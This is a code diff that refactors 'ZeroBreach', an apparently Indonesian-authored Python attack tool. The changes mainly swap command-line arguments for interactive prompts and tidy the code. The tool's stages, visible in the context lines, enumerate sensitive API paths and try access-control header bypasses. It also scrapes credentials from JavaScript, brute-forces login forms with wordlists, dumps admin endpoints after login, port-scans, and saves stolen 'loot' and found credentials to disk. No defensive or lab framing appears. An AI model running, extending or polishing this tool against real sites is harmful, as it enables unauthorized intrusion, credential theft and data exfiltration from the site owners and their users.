@@ -4,8 +4,6 @@ ZeroBreach — all-in-one recon + exploit + dump + brute
 Input: domain / endpoint aplikasi. Output: data yang berhasil di-tarik.
 """
 
-import argparse
-import base64
 import json
 import os
 import random
@@ -36,15 +34,14 @@ BOLD = Style.BRIGHT
 
 
 BANNER = r"""
-  ______  ______  ______  ______  ______  ______  ______  ______  ______  ______
- |  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  |
- | |  | || |  | || |  | || |  | || |  | || |  | || |  | || |  | || |  | || |  | |
- | |__| || |__| || |__| || |__| || |__| || |__| || |__| || |__| || |__| || |__| |
- |______||______||______||______||______||______||______||______||______||______|
-                                                                  zero breach
- 
-             >> ZeroBreach V1 <<
-             recon → exploit → dump → brute
+  ______  ______  ______  ______  ______  ______  ______  ______
+ |  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  |
+ | |  | || |  | || |  | || |  | || |  | || |  | || |  | || |  | |
+ | |__| || |__| || |__| || |__| || |__| || |__| || |__| || |__| |
+ |______||______||______||______||______||______||______||______|
+
+                        >> ZeroBreach V1 <<
+                  recon > exploit > dump > brute
 """
 
 
@@ -93,7 +90,6 @@ def looks_like_data(text):
     if "<!doctype html" in t or "<html" in t:
         if "login" in t or "password" in t:
             return False
-        # HTML biasa, bukan data
         if "<body" in t and len(t) > 500:
             return False
     return False
@@ -113,7 +109,7 @@ def get_kind(text):
 
 
 # ============================================================
-# TARGET PATHS
+# PATHS
 # ============================================================
 PATHS = [
     "/api/users", "/api/admin", "/api/config", "/api/settings",
@@ -194,18 +190,17 @@ class ZeroBreach:
         except FileNotFoundError:
             return []
 
-    # ---------------- req helpers ----------------
+    # ---------------- req ----------------
     def _req(self, method, path, headers=None, data=None, json_data=None,
              allow_redirects=True):
         url = path if path.startswith("http") else self.target + path
         try:
-            r = self.session.request(
+            return self.session.request(
                 method=method, url=url, headers=headers,
                 data=data, json=json_data,
                 timeout=self.timeout, verify=False,
                 allow_redirects=allow_redirects,
             )
-            return r
         except Exception as e:
             if self.verbose:
                 log("err", f"{method} {path} -> {e}")
@@ -247,7 +242,7 @@ class ZeroBreach:
         return True
 
     # ============================================================
-    # STAGE 1 — FINGERPRINT
+    # STAGE 1
     # ============================================================
     def stage_fingerprint(self):
         print(f"\n{C}=== STAGE 1: FINGERPRINT ==={RESET}")
@@ -273,11 +268,11 @@ class ZeroBreach:
             if kw in body:
                 tech.append(name)
         if tech:
-            log("ok", f"Tech: {', '.join(set(tech))}")
+            log("ok", f"Tech: {', '.join(sorted(set(tech)))}")
         return True
 
     # ============================================================
-    # STAGE 2 — ENDPOINT ENUM + AUTO DUMP
+    # STAGE 2
     # ============================================================
     def stage_endpoints(self):
         print(f"\n{C}=== STAGE 2: ENDPOINT ENUM ({len(PATHS)} path) ==={RESET}")
@@ -295,7 +290,6 @@ class ZeroBreach:
                 if not r:
                     continue
                 code = r.status_code
-
                 if code == 200:
                     if not self._auto_dump(p, r):
                         if len(r.text) > 300:
@@ -303,15 +297,13 @@ class ZeroBreach:
                                          f"HTTP 200 | {len(r.text)}B")
                 elif code == 401:
                     self._record("med", f"Butuh auth: {p}", "HTTP 401")
-                elif code == 403:
-                    pass
                 elif code == 500:
                     self._record("high", f"Error 500: {p}", "potensi info leak")
                     if looks_like_data(r.text):
                         self._auto_dump(f"err{p}", r)
 
     # ============================================================
-    # STAGE 3 — BYPASS
+    # STAGE 3
     # ============================================================
     def stage_bypass(self):
         print(f"\n{C}=== STAGE 3: HEADER BYPASS ==={RESET}")
@@ -332,7 +324,7 @@ class ZeroBreach:
                     break
 
     # ============================================================
-    # STAGE 4 — JS MINING
+    # STAGE 4
     # ============================================================
     def stage_js(self):
         print(f"\n{C}=== STAGE 4: JS MINING ==={RESET}")
@@ -362,16 +354,18 @@ class ZeroBreach:
                 if v.lower() in ("undefined", "null", "none", ""):
                     continue
                 log("crit", f"Cred di JS: {k}={v[:60]}")
-                self._record("crit", f"Credential di JS", f"{k}={v[:60]}")
+                self._record("crit", "Credential di JS", f"{k}={v[:60]}")
                 self._save(f"cred_{k}", f"{k}={v}")
-            for ep in set(ep_re.findall(jr.text))[:20]:
-                self._record("info", f"Endpoint di JS", ep)
+
+            eps = list(set(ep_re.findall(jr.text)))[:20]
+            for ep in eps:
+                self._record("info", "Endpoint di JS", ep)
                 er = self.get(ep)
                 if er and er.status_code == 200:
                     self._auto_dump(f"js{ep}", er)
 
     # ============================================================
-    # STAGE 5 — FIREBASE
+    # STAGE 5
     # ============================================================
     def stage_firebase(self):
         print(f"\n{C}=== STAGE 5: FIREBASE CHECK ==={RESET}")
@@ -414,10 +408,9 @@ class ZeroBreach:
                 pass
 
     # ============================================================
-    # STAGE 6 — DEFAULT CRED + BRUTE
+    # STAGE 6
     # ============================================================
     def _try_login(self, path, user, pw):
-        """Coba login di satu path, return response kalau sukses."""
         for key_u, key_p in [("email", "password"), ("username", "password"),
                              ("user", "pass"), ("login", "password")]:
             try:
@@ -445,11 +438,8 @@ class ZeroBreach:
         log("info", f"Users: {len(self.users)} | Passwords: {len(self.wordlist)}")
 
         for lp in LOGIN_PATHS:
-            # cek dulu endpoint ada
             r = self.post(lp, json_data={})
-            if not r:
-                continue
-            if r.status_code == 404:
+            if not r or r.status_code == 404:
                 continue
             log("info", f"Coba login di: {lp}")
 
@@ -467,7 +457,8 @@ class ZeroBreach:
                     counter += 1
                     if counter % 10 == 0:
                         el = time.time() - start
-                        print(f"\r  {C}[*]{RESET} {counter}/{len(futs)} | {counter/el:.1f}/s", end="")
+                        rate = counter / el if el else 0
+                        print(f"\r  {C}[*]{RESET} {counter}/{len(futs)} | {rate:.1f}/s", end="")
                     res = f.result()
                     if res:
                         found = res
@@ -487,7 +478,6 @@ class ZeroBreach:
             self._post_login_dump()
 
     def _post_login_dump(self):
-        """Setelah login, coba akses semua endpoint admin pake session."""
         log("info", "Akses endpoint admin pake session...")
         for p in ["/api/users", "/api/admin/users", "/api/application/users",
                   "/api/servers", "/api/client/account", "/api/keys",
@@ -497,7 +487,7 @@ class ZeroBreach:
                 self._auto_dump(f"postlogin{p}", r)
 
     # ============================================================
-    # STAGE 7 — PORT SCAN
+    # STAGE 7
     # ============================================================
     def stage_ports(self):
         print(f"\n{C}=== STAGE 7: PORT SCAN ==={RESET}")
@@ -553,18 +543,21 @@ class ZeroBreach:
         print(f"{G}[+] Loot: {self.outdir}/")
         print(f"{G}[+] Total file dumped: {len(self.loot)}")
 
-        with open("zerobreach_report.json", "w") as f:
-            json.dump({
-                "target": self.target,
-                "creds_found": self.found_creds,
-                "hits": self.hits,
-                "loot": [{"label": l, "kind": k, "size": s, "file": fp}
-                         for l, k, s, fp in self.loot],
-            }, f, indent=2)
-        print(f"{G}[+] Report: zerobreach_report.json{RESET}")
+        try:
+            with open("zerobreach_report.json", "w") as f:
+                json.dump({
+                    "target": self.target,
+                    "creds_found": self.found_creds,
+                    "hits": self.hits,
+                    "loot": [{"label": l, "kind": k, "size": s, "file": fp}
+                             for l, k, s, fp in self.loot],
+                }, f, indent=2)
+            print(f"{G}[+] Report: zerobreach_report.json{RESET}")
+        except Exception:
+            pass
 
     # ============================================================
-    # RUN ALL
+    # RUN
     # ============================================================
     def run(self):
         if not self.stage_fingerprint():
@@ -579,37 +572,44 @@ class ZeroBreach:
 
 
 # ============================================================
-# MAIN
+# MAIN — INPUT INTERAKTIF
 # ============================================================
 def main():
-    p = argparse.ArgumentParser(
-        description="ZeroBreach — all-in-one recon + exploit + dump + brute"
-    )
-    p.add_argument("target", help="Domain / endpoint target")
-    p.add_argument("--timeout", type=int, default=8)
-    p.add_argument("--threads", type=int, default=20)
-    p.add_argument("--outdir", default="loot")
-    p.add_argument("-v", "--verbose", action="store_true")
-    p.add_argument("--users", default="users.txt")
-    p.add_argument("--wordlist", default="wordlist.txt")
-
-    args = p.parse_args()
-
     print(G + BOLD + BANNER + RESET)
-    print(f"{C}Target  : {W}{args.target}{RESET}")
-    print(f"{C}Outdir  : {W}{args.outdir}{RESET}")
-    print(f"{C}Threads : {W}{args.threads}{RESET}\n")
+
+    target = input(f"{C}[?]{RESET} Masukkan URL target (contoh: http://target.com): ").strip()
+    if not target:
+        log("err", "URL kosong. Keluar.")
+        sys.exit(1)
+
+    outdir = input(f"{C}[?]{RESET} Outdir (default: loot): ").strip() or "loot"
+    threads_in = input(f"{C}[?]{RESET} Threads (default: 20): ").strip() or "20"
+
+    try:
+        threads = int(threads_in)
+    except ValueError:
+        threads = 20
+
+    print()
+    print(f"{C}Target  : {W}{target}{RESET}")
+    print(f"{C}Outdir  : {W}{outdir}{RESET}")
+    print(f"{C}Threads : {W}{threads}{RESET}\n")
 
     tool = ZeroBreach(
-        args.target,
-        timeout=args.timeout,
-        threads=args.threads,
-        outdir=args.outdir,
-        verbose=args.verbose,
-        users_file=args.users,
-        wordlist_file=args.wordlist,
+        target,
+        timeout=8,
+        threads=threads,
+        outdir=outdir,
+        verbose=False,
+        users_file="users.txt",
+        wordlist_file="wordlist.txt",
     )
-    tool.run()
+
+    try:
+        tool.run()
+    except KeyboardInterrupt:
+        print(f"\n{Y}[!] Interrupted by user.{RESET}")
+        sys.exit(0)
 
 
 if __name__ == "__main__":
